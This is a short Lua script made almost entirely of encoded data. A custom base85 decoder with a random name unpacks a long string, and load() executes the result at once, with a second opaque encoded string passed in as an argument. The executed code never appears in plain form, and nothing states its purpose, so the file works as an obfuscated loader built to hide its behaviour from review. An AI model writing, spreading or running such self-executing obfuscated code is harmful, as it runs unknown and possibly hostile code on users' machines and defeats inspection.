
local function pQGyPCiFrK(s)
    local m = {}
    local c = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
    for i=1,85 do m[string.byte(c,i)] = i-1 end
    local o, v, n, p = {}, 0, 0, {52200625, 614125, 7225, 85, 1}
    for i=1, #s do
        local x = m[string.byte(s,i)]
        if x then
            v = v + x * p[n+1]
            n = n + 1
            if n == 5 then
                table.insert(o, string.char(math.floor(v/16777216), math.floor((v%16777216)/65536), math.floor((v%65536)/256), v%256))
                v, n = 0, 0
            end
        end
    end
    return table.concat(o)
end
assert(load(pQGyPCiFrK("3LqdLAZ%}AVQe5;WpzzsZggx-XCOTwb98cPZf7oIXkl_FH#RFWGAuSLG&3wQF)=MOFf24HG&L+TIV&_XEH*bQGc_zSH!CzXEH*SPF*PhWG%GSVEHN-LEipMPH!&+SIV?3fD={}LH8?9YG%PtcEiyMOF*hqSGAuYZEi*YRG&U<UIV?FbEi*VQF*G<WGdV0WIV&_UEHg1HGBPYNH8d?VG%PVNFfB1TEH*MLGB7MNI4dzZEHX4JGcqhVH7zqREH*PMGBPYNGdC?VF)T4OFfBAQEI2ePGC3?UH8CwSI4KGsARr)YZ)0I>AZB%LV{~b6ZXi!ZVrgnmMRaI)C}AvODIjcbV_|F{a4cgzF)T1UAa`hKY-J!}J}@9*Ze$>0J}@9;Zy;=MV_|F{a$ziTVm)CcGAv>xGCLq?W*~B5em!zxAarPDZXjblV=HhVWo~3UAYm+GEO0$2VJ&iDDK9cCC}J&gVks{&EO06^J0N9lWIG^fW*}iaVjy&AWo{s0Jz^kbZe%+kcW7yBWguZbFd$@aAZ%}AVQe6BVLf3bGCLq?W*~B5J}@A3Xk~67V?ARla3E!FWIG^XEO0$2VJ&iDDK9cCa4Ir8AZ2c3J0NmpbairWAY(fqWo~3U3LqdLAZ%}AVQe5~b#7yHX>V>ILq~Q?XIfEVZ)hlFEFfzs3LqdLARr(hAZ%}AVQe6CAUz;^eIRCUav*6vFf1}PH6UbfAah%3T|H?aWo~2&ARr(hARr(hY;R*>Y#?eNJs>a&ARr(hARr(hW^ZyJX+1D3GBq_IWN!)}ARr(hARr(hARr)WAUz-`Y9K2hb6aU$AS)nqbaH8KXD(uSbY&=OEFdUpASECpYbhWrATcQ^ASEC&H8u($ARr(hARr(hARr)fTWMV^Aah%4T_8Omb6aX%EFg1RX<Z5+ARr(hARr)RZe$7|ARr(hARr)YZ)0I>AZaWhZ*_DaJs>bFAbWiZARr(hARr(hY9KuzFbW_bARr(hARuOMav*7Bcs(&JAR}ZTWN!)}ARr(hARr(hARr)VAUz-`X&@^gF)1J=ATl*J3LqdLARr(hARr(hAZj2zASh}eD<E@QX<aEGB_J|2HVPmhARr(hARr(hARu#FX<aNJb6aX%AUz;+TWVb_Aah%3T?!x|ARr(hARr(hARupbbXy~Db#yB+T_8Omb98cPZf7oIXkl_FPeo#BYEMOUXm==cbaH8KXD(uSbY&=HEFfuQcquF(b6Y5LTWMV&D<E@QYF#NHB_J|2HeD$x3LqdLARr(hAZ2c33LqdLARr(hAaZ4Nb#iVXbYWs_WiDfHZew9|C~tLiDGDGUARuLKWC|c4ARuyObairWAZB%LV{~b6ZYXeHVmLJ^3LqdLARr(hAZ%}AVQe66VQ?TlAbWiZARr(hARr(hY;R*>Y#?K3VRCaIJs=`5F)}kWH8wXmIYB~0L`6nNNJ&adOifNtP*GA-R8>}2SXo+OVq;`wW@l(=YHMt5Zf|gLa&vTbc6WGrdLbhuB_=2-Dl08JJUu=?Kwe*9dwhL<A_^cNARr(hARuOMav*6vF)TPWAY^YKZDDX*b98cPZf7oHd30qcV`yP=b1Z2oT_8OmX)Q4zWo~2&ARr(hARr(hY;R*>Y#?uSbSxltVQefQV{dhCbRaz-dwnb*Ff1T23LqdLARr(hAZ%}AVQe69Z+CMbJs^8EGBPkQHZnCVAT}{HF)}qQAU85HH7p=FH7p=8eF`8TARr(hARuOMav*6vF)Sb>a9?6LH6Ubf3LqdLARr(hARr(hAZ%}AVQe6FAUz;$VQ^b>baH8KXD(uSbY&=TUt%~lEFftqT?!x|ARr(hARr(hARuXGAa)>hXk~5+ARr(hARr(hARr(hARr(hc42HFJs@^rY#=Kjb|5MsaBp{WTVro^ZgeX#T?!x|ARr(hARr(hARr(hARuFJb#8PZJs@Lmb#8PZD<ClnARr(hARr(hARr(hARr(hX=Wf}Z*^{TAU!=GH6V0oWo`-}ARr(hARr(hARr(hARr(hARr)gVPb4$E@^IaWpZ>VZ*_DmAaitbX>MmOV`yP=C~aYMXf9@KZ*Ouac42HUF*Y|hH!?9cDJ&puVRUFNW^8Y7awsTvVQeKaHa9mnGBGwOFE%wbGd3wKAZ=lEXf9@KZ*OuaD0X3NB{nrRGd3wNGBq|SEFgAaY$Y-^HYq6zARr(hARr(hARr(hARr(hARr(hc42HRAY*TJZge0$ATTT-FbW_bARr(hARr(hARr(hARuLKWC|c4ARr(hARr(hARuLKWC|c4ARr(hARuLKWC|c4ARr(hARugSV_|F{WMyM=d2n=PWFS2tLq~Q?XIfEVZ)hlVVPb4$E@N+QV_|eCZ*_DjEFfBCbxmV#bZkv$DGDGUARr(hARu9Lb7gXLC~R+GWGG~1V{&<LbY)~IDJUrlARr(hWo~2&ARr(h")))()("<?C7xo7y{%@K{jmrKyHY2$>=*PPaK;td>&uNG}7D*LH}{)4@Yso0BW(5@nwe6<+d*jhF&6QWFJQ`YCwLxS(#w1lwD;EZtfV+Vd@Z^^wD|AbkI9$6NBpthuz9o(i4}Hde}QS)-jXeYguj?UAoB)YPa`n27-fmAnkgPY&kH8ekgmso}}gvu1TJQkohi%MkNcvozY=7#HHpLIl;uz7LiVND_@l@-_W~&l)!15DPC98HDu3ZGw8?D!DzWe>e`%@(<}J+838AjlO&B49vc(Xg~D")
